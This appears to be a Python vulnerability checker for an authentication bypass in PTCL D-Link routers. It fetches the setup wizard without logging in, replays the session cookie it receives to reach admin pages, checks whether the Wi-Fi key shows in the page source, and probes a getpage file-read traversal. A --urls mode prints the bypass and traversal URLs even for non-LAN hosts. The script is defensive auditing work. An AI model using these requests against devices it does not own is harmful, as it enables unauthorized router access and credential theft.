#!/usr/bin/env python3
"""
ptcl_check.py - read-only detector for the PTCL D-Link `webproc` authentication bypass.

Checks, on YOUR OWN LAN ONLY, whether a D-Link DSL-series router (PTCL ISP build) will:

  A. serve the setup-wizard pages to an unauthenticated request   (the "opens without login" bug)
  B. mint a `:sessionid` from that unauthenticated request and then
     keep treating it as logged in                                (the "keeps open" bug)
  C. expose live Wi-Fi config through the wizard template          (credential disclosure)
  D. serve arbitrary files via the `getpage` parameter             (CVE-2025-34048 probe)

Safety properties, by construction:
  * GET only. No POST. No credential submission. No config writes.
  * Targets must resolve to RFC1918 / link-local. Public IPs are refused.
  * The Wi-Fi value is masked in all output; only presence/absence is reported.
  * The traversal probe requests /proc/version ONLY, and reports reachability,
    never the contents of anything sensitive.

Standard library only. Python 3.8+.

    python3 ptcl_check.py 192.168.10.1
    python3 ptcl_check.py 192.168.1.1 --json report.json
"""

from __future__ import annotations

import argparse
import http.client
import ipaddress
import json
import re
import socket
import sys
from datetime import datetime, timezone


# --------------------------------------------------------------------------- #
# Target policy
# --------------------------------------------------------------------------- #

_ALLOWED_NETS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("fc00::/7"),
    ipaddress.ip_network("fe80::/10"),
    # loopback is unambiguously this machine - it is what selftest_mock.py binds to
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("::1/128"),
]


def resolve_private(host: str) -> str:
    """Return the address to connect to, or raise if it is not LAN-local."""
    try:
        infos = socket.getaddrinfo(host, None, proto=socket.IPPROTO_TCP)
    except socket.gaierror as exc:
        raise ValueError(f"cannot resolve {host!r}: {exc}") from exc
    if not infos:
        raise ValueError(f"cannot resolve {host!r}")

    addr = ipaddress.ip_address(infos[0][4][0])
    if not any(addr in net for net in _ALLOWED_NETS):
        raise ValueError(
            f"{host} resolves to {addr}, which is not a private/LAN address.\n"
            "This tool only probes devices on your own network (RFC1918 / link-local). "
            "Probing a device you do not own is not something it will help with."
        )
    return str(addr)


# --------------------------------------------------------------------------- #
# HTTP, minimal and transparent
# --------------------------------------------------------------------------- #


class Resp:
    def __init__(self, status: int, headers, body: bytes):
        self.status = status
        self.headers = headers          # list of (name, value)
        self.body = body

    @property
    def text(self) -> str:
        return self.body.decode("utf-8", "replace")

    def header(self, name: str) -> str | None:
        for k, v in self.headers:
            if k.lower() == name.lower():
                return v
        return None

    def set_cookies(self) -> dict:
        """Every Set-Cookie, kept verbatim. The router's cookie is named ':sessionid',
        which is not a legal RFC-6265 name, so we do not try to be clever about it."""
        jar = {}
        for k, v in self.headers:
            if k.lower() != "set-cookie":
                continue
            pair = v.split(";", 1)[0].strip()
            if "=" in pair:
                name, _, value = pair.partition("=")
                jar[name.strip()] = value.strip()
        return jar


class Client:
    def __init__(self, host: str, port: int, timeout: float, verbose: bool = False):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.verbose = verbose
        self.cookies: dict[str, str] = {}

    def get(self, path: str, use_cookies: bool = True, extra_headers: dict | None = None) -> Resp:
        conn = http.client.HTTPConnection(self.host, self.port, timeout=self.timeout)
        headers = {
            "User-Agent": "ptcl_check/1.0 (read-only LAN audit)",
            "Accept": "text/html,*/*",
            "Connection": "close",
        }
        if use_cookies and self.cookies:
            headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in self.cookies.items())
        if extra_headers:
            headers.update(extra_headers)

        if self.verbose:
            print(f"    -> GET {path}")
        try:
            conn.request("GET", path, headers=headers)
            raw = conn.getresponse()
            body = raw.read()
            resp = Resp(raw.status, raw.getheaders(), body)
        finally:
            conn.close()

        if self.verbose:
            print(f"    <- {resp.status} {len(resp.body)} bytes")
        return resp


# --------------------------------------------------------------------------- #
# The probes
# --------------------------------------------------------------------------- #

WEBPROC = "/cgi-bin/webproc"


# The query strings are assembled by hand, not with urlencode(), on purpose: the
# webproc CGI expects the literal `var:menu=setup` form, and percent-encoding the
# colon (`var%3Amenu`) or the slashes in `getpage` changes the request enough that
# firmware which accepts the published PoC may reject ours. Match the known-good
# PoC byte for byte.
def wizard_path(subpage: str | None = None) -> str:
    q = ("getpage=html/index.html&errorpage=html/index.html"
         "&var:language=en_us&var:menu=setup")
    if subpage:
        q += f"&var:subpage={subpage}"
    return f"{WEBPROC}?{q}&var:page=wizard"


def traversal_path(target: str) -> str:
    return (f"{WEBPROC}?getpage={target}&errorpage=html/main.html"
            "&var:language=en_us&var:menu=setup&var:page=wizard")


# Classification. Tightened deliberately: a wizard page legitimately contains
# <input type="password"> for the PSK, so "the word password appears" is NOT a
# login-page signal. Only a credential form aimed at the real login action counts.
LOGIN_FORM_RE = re.compile(
    r'name\s*=\s*["\']?:password'          # the actual login password field
    r'|:action\s*=\s*["\']?Login'          # the login submit
    r'|Username\s+or\s+Password',          # its error string
    re.I,
)

# These two run against the RAW page: on this UI the values are emitted inside
# <script> as JS assignments, not as visible text.
SSID_RE = re.compile(r'var\s+wireless_name\s*=\s*"([^"]*)"')
WPA_RE = re.compile(r'var\s+randomWPAKEY\s*=\s*"([^"]*)"')

# Device info, by contrast, is a visible label/value pair - usually `Model Name`
# in one <td> and the value in the next. Strip tags before matching so the markup
# between label and value does not break the match.
_TAG_RE = re.compile(r"<[^>]*>")


def strip_tags(html: str) -> str:
    return re.sub(r"\s+", " ", _TAG_RE.sub(" ", html))


# Values are single tokens - no spaces - otherwise the match runs on into the next
# label on the page ("DSL-2750U Firmware Version PT_2.00 ..."). A build date is
# allowed to trail the firmware string, since that is how PTCL labels it.
MODEL_RE = re.compile(
    r'(?:Model\s*(?:Name)?|Device\s*Name)\s*:?\s*([A-Za-z0-9][A-Za-z0-9\-_/]{1,31})', re.I)
FW_RE = re.compile(
    r'(?:Firmware\s*Version|Software\s*Version|FW\s*Ver)\s*:?\s*'
    r'([A-Za-z0-9][A-Za-z0-9\-_.]{1,31}(?:\s+[0-9]{6,8})?)', re.I)


def mask(value: str) -> str:
    """Never print a credential. Show shape, not content."""
    if value is None:
        return "(none)"
    if len(value) <= 2:
        return "*" * len(value)
    return f"{value[0]}{'*' * (len(value) - 2)}{value[-1]} (len={len(value)})"


def looks_like_login(text: str) -> bool:
    """True only for a real credential form - see LOGIN_FORM_RE for why this is strict."""
    return bool(LOGIN_FORM_RE.search(text))


def probe(host: str, port: int, timeout: float, verbose: bool) -> dict:
    c = Client(host, port, timeout, verbose)
    out: dict = {
        "target": f"{host}:{port}",
        "timestamp": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "checks": {},
    }

    # -- 0. baseline ------------------------------------------------------- #
    try:
        base = c.get("/", use_cookies=False)
    except (OSError, http.client.HTTPException) as exc:
        out["reachable"] = False
        out["error"] = f"{type(exc).__name__}: {exc}"
        return out
    out["reachable"] = True

    jav = base.set_cookies()
    out["checks"]["baseline"] = {
        "status": base.status,
        "location": base.header("Location"),
        "redirects_to_login": base.status in (301, 302, 303, 307) or "login" in (base.header("Location") or "").lower(),
        "login_form_on_root": looks_like_login(base.text),
        "cookies_set": sorted(jav.keys()),
    }

    # -- A + C. the wizard bypass ------------------------------------------ #
    wiz = c.get(wizard_path())
    wiz_txt = wiz.text
    wizard_served = wiz.status == 200 and not looks_like_login(wiz_txt)

    ssid = SSID_RE.search(wiz_txt)
    wpa = WPA_RE.search(wiz_txt)

    wl = c.get(wizard_path("wizwl"))
    wl_txt = wl.text
    wl_served = wl.status == 200 and not looks_like_login(wl_txt)
    ssid_wl = SSID_RE.search(wl_txt)
    wpa_wl = WPA_RE.search(wl_txt)

    out["checks"]["wizard_bypass"] = {
        "url": wizard_path("wizentrance"),
        "status": wiz.status,
        "served_without_auth": wizard_served,
        "session_cookie_issued": bool(wiz.set_cookies() or jav),
        "cookies_from_bypass": sorted(wiz.set_cookies().keys()),
        "verdict": "VULNERABLE" if wizard_served else "not bypassable",
    }
    out["checks"]["wifi_disclosure"] = {
        "url": wizard_path("wizwl"),
        "status": wl.status,
        "served_without_auth": wl_served,
        "ssid_present": bool(ssid_wl or ssid),
        "ssid_masked": mask(ssid_wl.group(1) if ssid_wl else (ssid.group(1) if ssid else "")),
        "wpa_key_present": bool(wpa_wl or wpa),
        "wpa_key_masked": mask(wpa_wl.group(1) if wpa_wl else (wpa.group(1) if wpa else "")),
        "verdict": "DISCLOSED" if (wpa_wl or wpa) else "not present in template",
    }

    # -- B. does the bypassed session persist? ----------------------------- #
    # Adopt whatever the unauthenticated wizard request handed us, then ask for
    # the dashboard with it. If that succeeds, this is the "keeps open" symptom.
    bypass_cookies = wiz.set_cookies() or wl.set_cookies()
    c.cookies.update(bypass_cookies)

    dash = c.get(
        WEBPROC + "?getpage=html/index.html&errorpage=html/index.html"
                 "&var:language=en_us&var:menu=status&var:page=deviceinfo"
    )
    dash_authed = dash.status == 200 and not looks_like_login(dash.text)

    # Second navigation, fresh connection: proves it is server-side state, not a
    # one-shot response.
    again = c.get(
        WEBPROC + "?getpage=html/index.html&errorpage=html/index.html"
                 "&var:language=en_us&var:menu=advanced&var:page=accessctl"
    )
    again_authed = again.status == 200 and not looks_like_login(again.text)

    dash_flat = strip_tags(dash.text)
    model = MODEL_RE.search(dash_flat)
    fw = FW_RE.search(dash_flat)

    out["checks"]["session_persistence"] = {
        "cookie_used": {k: mask(v) for k, v in bypass_cookies.items()},
        "protected_page_served": dash_authed,
        "second_navigation_served": again_authed,
        "no_credentials_submitted": True,
        "verdict": ("KEEPS OPEN - session accepted on later requests"
                    if dash_authed or again_authed else
                    "session not honoured"),
    }
    out["device"] = {
        "model_guess": (model.group(1).strip() if model else None),
        "firmware_guess": (fw.group(1).strip() if fw else None),
    }

    # -- D. traversal reachability (benign target only) -------------------- #
    trav = c.get(traversal_path("/proc/version"), use_cookies=True)
    trav_txt = trav.text
    # /proc/version from the device would mention Linux; a rejected read would not.
    read_ok = trav.status == 200 and "linux" in trav_txt.lower() and "var:menu=" not in trav_txt

    out["checks"]["traversal"] = {
        "probe_target": "/proc/version",
        "status": trav.status,
        "arbitrary_file_read": read_ok,
        "note": "reachability only - no sensitive file was requested",
        "verdict": ("PATH TRAVERSAL - unauthenticated file read"
                    if read_ok else "not demonstrated"),
    }

    # -- overall ------------------------------------------------------------ #
    if wizard_served and (dash_authed or again_authed):
        overall = "VULNERABLE"
    elif wizard_served:
        overall = "PARTIAL"
    else:
        overall = "NOT VULNERABLE"
    out["verdict"] = overall
    return out


# --------------------------------------------------------------------------- #
# Reporting
# --------------------------------------------------------------------------- #

BAR = "-" * 68
TICK = {"VULNERABLE": "VULNERABLE", "PARTIAL": "PARTIAL", "NOT VULNERABLE": "NOT VULNERABLE"}


def report(r: dict) -> None:
    print()
    print(BAR)
    print("  PTCL D-Link webproc auth-bypass check - READ-ONLY, LAN-ONLY")
    print(BAR)
    print(f"  target    : {r['target']}")
    print(f"  timestamp : {r['timestamp']}")

    if not r.get("reachable"):
        print(f"  result    : UNREACHABLE ({r.get('error')})")
        print(BAR)
        print("  Nothing was probed. Check the IP, that you are on the router's")
        print("  network, and that its web UI is enabled.")
        print()
        return

    dev = r.get("device") or {}
    if dev.get("model_guess") or dev.get("firmware_guess"):
        print(f"  device    : {dev.get('model_guess') or '?'}  fw {dev.get('firmware_guess') or '?'}")

    c = r["checks"]

    b = c["baseline"]
    print()
    print("  1. baseline")
    print(f"     GET /                    -> {b['status']}"
          + (f" Location: {b['location']}" if b.get("location") else ""))
    print(f"     login form on root       : {'yes' if b['login_form_on_root'] else 'no'}"
          f"   (expected: yes)")
    print(f"     cookies handed out       : {', '.join(b['cookies_set']) or 'none'}")

    w = c["wizard_bypass"]
    print()
    print("  2. wizard URL without login            [the 'opens without login' bug]")
    print(f"     {w['url']}")
    print(f"     HTTP status              : {w['status']}")
    print(f"     served without auth      : {'YES' if w['served_without_auth'] else 'no'}")
    print(f"     session cookie issued    : {'YES' if w['session_cookie_issued'] else 'no'}"
          f"   {', '.join(w['cookies_from_bypass']) or ''}")

    d = c["wifi_disclosure"]
    print()
    print("  3. wireless template disclosure")
    print(f"     served without auth      : {'YES' if d['served_without_auth'] else 'no'}")
    print(f"     SSID exposed in source   : {'YES' if d['ssid_present'] else 'no'}"
          + (f"   [{d['ssid_masked']}]" if d["ssid_present"] else ""))
    print(f"     WPA key exposed in source: {'YES' if d['wpa_key_present'] else 'no'}"
          + (f"   [{d['wpa_key_masked']}]" if d["wpa_key_present"] else ""))

    p = c["session_persistence"]
    print()
    print("  4. does the bypassed session persist?  [the 'keeps open' bug]")
    print(f"     cookie replayed          : {', '.join(p['cookie_used']) or 'none captured'}")
    print(f"     protected page served    : {'YES' if p['protected_page_served'] else 'no'}")
    print(f"     second navigation served : {'YES' if p['second_navigation_served'] else 'no'}")
    print(f"     -> {p['verdict']}")

    t = c["traversal"]
    print()
    print("  5. getpage traversal (probe: /proc/version)")
    print(f"     HTTP status              : {t['status']}")
    print(f"     unauthenticated read     : {'YES' if t['arbitrary_file_read'] else 'no'}")
    print(f"     note                     : {t['note']}")

    print()
    print(BAR)
    print(f"  VERDICT: {r['verdict']}")
    print(BAR)
    if r["verdict"] == "VULNERABLE":
        print("  Your unit serves authenticated pages to requests that carried no")
        print("  credentials. Treat the admin password and the Wi-Fi PSK as exposed.")
        print()
        print("  Do, in this order:")
        print("    1. change the Wi-Fi PSK, then the admin password")
        print("    2. disable remote/WAN management")
        print("    3. reboot the router (bypass-minted sessions live in RAM only)")
        print("    4. ask PTCL for a current build for your H/W revision")
        print("    5. bridge the unit and put your own router behind it")
    elif r["verdict"] == "PARTIAL":
        print("  The wizard renders without auth, but the session was not honoured on")
        print("  later requests. Lower risk - the disclosure in section 3 still applies.")
    else:
        print("  No unauthenticated wizard access observed. Your build appears to")
        print("  guard this path. Re-run after any firmware change.")
    print()


def print_urls(host: str, port: int) -> None:
    """Print every URL variant, so they can be pasted straight into a browser."""
    auth = "" if port == 80 else f":{port}"
    base = f"http://{host}{auth}"
    w = base + WEBPROC

    # The subpage values below are the ONLY ones documented in public research.
    # The wizard has five steps; the other three step names are not published, and
    # guessing them is not useful - whatever the router itself links to is the truth.
    rows = [
        ("baseline - should show the login form",
         f"{base}/"),
        ("BYPASS - wizard entrance",
         w + "?getpage=html/index.html&errorpage=html/index.html"
             "&var:language=en_us&var:menu=setup&var:subpage=wizentrance&var:page=wizard"),
        ("BYPASS - wizard, no subpage (the shortest form)",
         w + "?getpage=html/index.html&var:menu=setup&var:page=wizard"),
        ("BYPASS - wizard wireless step: leaks SSID + WPA key into the page source",
         w + "?getpage=html/index.html&errorpage=html/index.html"
             "&var:language=en_us&var:menu=setup&var:subpage=wizwl&var:page=wizard"),
        ("dashboard - only reachable after one of the above if the session is honoured",
         w + "?getpage=html/index.html&errorpage=html/index.html"
             "&var:language=en_us&var:menu=status&var:page=deviceinfo"),
        ("second navigation - proves the session persists across pages",
         w + "?getpage=html/index.html&errorpage=html/index.html"
             "&var:language=en_us&var:menu=advanced&var:page=accessctl"),
        ("traversal - the shape used for the file-read bug (CVE-2025-34048)",
         w + "?getpage=/proc/version&errorpage=html/main.html"
             "&var:language=en_us&var:menu=setup&var:page=wizard"),
    ]

    print()
    print(BAR)
    print("  URL variants for the PTCL D-Link webproc bypass")
    print(BAR)
    print(f"  host: {host}   (also try the other management IP - 192.168.10.1 vs 192.168.1.1)")
    for label, url in rows:
        print()
        print(f"  {label}")
        print(f"    {url}")
    print()
    print(BAR)
    print("  Notes")
    print("  * This is ONE mechanism, not one magic URL. `var:subpage` selects which")
    print("    wizard step is rendered, so several URLs do the same job. Any ONE of")
    print("    them is enough to get in; you do not need all of them.")
    print("  * `wizentrance` and `wizwl` are the only subpage names published in")
    print("    public research. The wizard has five steps; the other three names are")
    print("    not documented, and guessing them is not worth your time.")
    print("  * The traversal row is shown so the shape is recognisable. Change the")
    print("    target after `getpage=` and there are as many URLs as there are files")
    print("    on the device - that is why the CVE exists. This tool only ever asks")
    print("    for /proc/version; the sensitive variants are documented in")
    print("    ../notes/auth-bypass.md, not here.")
    print("  * Read-only reminder: the dashboard row does nothing on its own. It only")
    print("    returns anything if you already carry a session from a BYPASS row above.")
    print(BAR)
    print()


# --------------------------------------------------------------------------- #

def main(argv=None) -> int:
    ap = argparse.ArgumentParser(
        description="Read-only LAN check for the PTCL D-Link webproc auth bypass.",
        epilog="Only probes private/LAN addresses. GET only. Never submits credentials.",
    )
    ap.add_argument("host", help="router address, e.g. 192.168.10.1")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--timeout", type=float, default=6.0)
    ap.add_argument("--json", metavar="PATH", help="also write the raw result as JSON")
    ap.add_argument("--urls", action="store_true",
                    help="print every URL variant and exit without probing anything")
    ap.add_argument("-v", "--verbose", action="store_true", help="log every request")
    args = ap.parse_args(argv)

    if args.urls:
        # no network traffic at all - this is a printed reference
        print(f"resolving {args.host} ...", end=" ", flush=True)
        try:
            addr = resolve_private(args.host)
            print(addr)
        except ValueError:
            print("(not a LAN address, showing the list anyway)")
            addr = args.host
        print_urls(addr, args.port)
        return 0

    print(f"resolving {args.host} ...", end=" ", flush=True)
    try:
        addr = resolve_private(args.host)
    except ValueError as exc:
        print("refused")
        print(f"\n{exc}\n", file=sys.stderr)
        return 2
    print(addr)

    if args.verbose:
        print("probing (GET only, no credentials will be sent):")

    try:
        result = probe(addr, args.port, args.timeout, args.verbose)
    except KeyboardInterrupt:
        print("\ninterrupted", file=sys.stderr)
        return 130

    report(result)

    if args.json:
        with open(args.json, "w", encoding="utf-8") as fh:
            json.dump(result, fh, indent=2)
        print(f"  raw result written to {args.json}\n")

    return 0 if result.get("verdict") != "VULNERABLE" else 1


if __name__ == "__main__":
    sys.exit(main())
